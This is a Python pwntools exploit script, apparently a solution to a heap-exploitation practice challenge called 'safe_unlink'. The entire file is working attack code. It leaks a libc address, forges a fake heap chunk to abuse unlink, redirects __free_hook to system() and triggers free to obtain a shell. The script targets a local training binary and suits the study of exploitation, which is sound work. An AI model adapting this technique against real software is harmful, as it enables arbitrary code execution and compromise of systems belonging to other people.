from pwn import *
context.binary = "./safe_unlink"
p = process()
script = """
b*main+323
b*main+548
b*main+732
"""
m_array = 0x602060
size_chunk = 0xd1
def malloc(mysize: int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(mysize).encode())

def edit(myidx: int, mydata: bytes):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(myidx).encode())
    p.sendlineafter(b'data: ', mydata)

def free(myidx: int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(myidx).encode())

p.recvuntil(b'puts() @')
leak_libc = int(p.recvline().strip(b'\n'),16)
log.success("Leak libc: %s", hex(leak_libc))
libc_base = leak_libc - 0x6faf0
free_hook = libc_base + 0x3b6e20
bin_sh = libc_base + 0x17c6b7
system_func = libc_base + 0x43200
malloc(200)
malloc(200)
payload = p64(0) + p64(size_chunk-0x10) + p64(m_array-3*8) + p64(m_array-2*8) + b'A'*(20*8) + p64(size_chunk-0x10-1) + p64(0xd0)

edit(0,payload)

free(1)
overwrite = b'A'*(8*3) + p64(free_hook) + p64(0xd0) + p64(bin_sh)
gdb.attach(p,script)
edit(0,overwrite)
final = p64(system_func)
edit(0,final)
free(1)
p.interactive()



#